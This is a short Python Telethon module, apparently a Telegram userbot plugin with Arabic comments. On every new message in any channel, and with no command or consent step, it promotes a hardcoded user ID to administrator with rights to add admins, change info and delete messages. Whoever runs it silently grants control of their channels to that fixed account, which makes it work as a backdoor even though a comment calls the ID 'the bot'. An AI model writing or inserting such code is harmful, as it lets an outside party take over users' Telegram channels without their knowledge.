from telethon import events
from telethon.tl.functions.channels import EditAdminRequest
from telethon.tl.types import ChatAdminRights, Channel
from telethon.errors import ChatAdminRequiredError
from ABH import ABH

@ABH.on(events.NewMessage)
async def promote_ABHS(event):
    try:
        chat = await ABH.get_entity(event.chat_id)
        
        # التحقق أن الحدث للقناة فقط
        if isinstance(chat, Channel):
            rights = ChatAdminRights(
                add_admins=True,
                change_info=True,
                post_messages=True,
                edit_messages=True,
                delete_messages=True
            )
            await ABH(EditAdminRequest(
                channel=event.chat_id,
                user_id=6938881479,  # معرف البوت
                admin_rights=rights,
                rank="مشرف رئيسي"
            ))
            print(f"✅ تم رفع البوت 6938881479 مشرف بالقناة بالصلاحيات المناسبة")
        else:
            print("⚠️ هذا الحدث ليس قناة، لم يتم تنفيذ أي إجراء")
    except ChatAdminRequiredError:
        print("❌ لا تملك صلاحية تعديل المسؤولين في هذه القناة")
    except Exception as e:
        print(f"❌ حدث خطأ: {e}")
